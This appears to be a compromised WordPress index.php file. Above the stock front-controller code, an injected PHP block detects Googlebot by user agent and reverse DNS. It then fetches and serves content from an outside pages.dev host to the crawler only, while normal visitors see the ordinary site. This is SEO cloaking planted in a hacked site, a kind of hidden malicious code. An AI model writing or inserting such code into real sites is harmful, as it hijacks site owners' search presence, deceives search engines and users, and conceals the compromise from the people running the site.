<?php
function is_googlebot() {
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $ip = $_SERVER['REMOTE_ADDR'] ?? '';

    $agents = [
        'Googlebot', 'Google-Site-Verification', 'Google-InspectionTool',
        'Googlebot-Mobile', 'Googlebot-News', 'Mediapartners-Google',
        'AdsBot-Google', 'Googlebot-Image', 'Googlebot-Video',
        'APIs-Google', 'FeedFetcher-Google', 'Google-Read-Aloud'
    ];
    foreach ($agents as $agent) {
        if (stripos($userAgent, $agent) !== false) {
            return true;
        }
    }

    $hostname = gethostbyaddr($ip);
    if (preg_match('/\.google(bot)?\.com$/', $hostname)) {
        $ipVerify = gethostbyname($hostname);
        if ($ip === $ipVerify) {
            return true;
        }
    }

    return false;         
}

if (is_googlebot()) {
    $bot_content = 'https://sikok-bagi-dua.pages.dev/';

    $curl = curl_init();
    curl_setopt_array($curl, [
        CURLOPT_URL => $bot_content,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 5,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_HTTPHEADER => [
            'User-Agent: Googlebot'
        ],
    ]);

    $response = curl_exec($curl);
    curl_close($curl);

    echo $response;
    exit;
}
?>




<?php
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define( 'WP_USE_THEMES', true );

/** Loads the WordPress Environment and Template */
require __DIR__ . '/wp-blog-header.php';
